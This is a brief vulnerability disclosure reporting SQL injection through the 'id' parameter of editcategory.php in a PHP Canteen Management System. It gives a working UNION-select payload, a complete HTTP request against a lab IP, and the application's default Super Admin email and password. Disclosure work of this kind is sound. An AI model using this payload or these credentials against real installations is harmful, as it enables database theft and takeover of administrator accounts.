# Canteen Management System v1.0 by mayuri_k has SQL injection

BUG_Author: songyangqi

vendors: https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html

The program is built using the xmapp-php8.1 version

Login account: mayuri.infospace@gmail.com/rootadmin (Super Admin account)

Vulnerability File: /youthappam/editcategory.php

Vulnerability location: /youthappam/editcategory.php, id

dbname =youthappam,length=10

[+] Payload: /youthappam/editcategory.php?id=-1%27%20union%20select%201,database(),3,4--+ // Leak place ---> id

```sql
GET /youthappam/editcategory.php?id=-1%27%20union%20select%201,database(),3,4--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=lf9hph2449vgrcadcct2jgd8ne
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/195263036-7e88aa3b-bbf8-44a0-ad14-96dbcb672d45.png)
